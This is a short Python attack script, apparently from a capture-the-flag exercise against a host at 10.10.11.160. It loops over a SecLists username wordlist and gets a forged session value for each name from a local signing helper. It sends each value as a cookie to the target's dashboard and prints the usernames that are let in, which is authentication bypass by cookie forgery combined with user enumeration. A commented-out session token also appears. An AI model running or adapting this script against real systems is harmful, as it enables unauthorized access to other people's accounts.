import requests



headers = {
    'Host': '10.10.11.160:5000',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://10.10.11.160:5000/login',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'max-age=0',
    # 'Cookie': 'session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiamF5ZGVuIn0.YoN7Fw.E1mmHzzfFILXhEaTaXSfsQZnn6I',
}


with open("/usr/share/seclists/Usernames/Names/names.txt", 'r') as file:
    users = file.read()
    username = users.split("\n")
    
for user in username:
    response = requests.get(f"http://localhost:5000/?username={user}")

    cookies = {
        'session': response.text,
    }

    response = requests.get('http://10.10.11.160:5000/dashboard', cookies=cookies, headers=headers, verify=False, allow_redirects=False)
    if response.status_code == 200:
        print(user)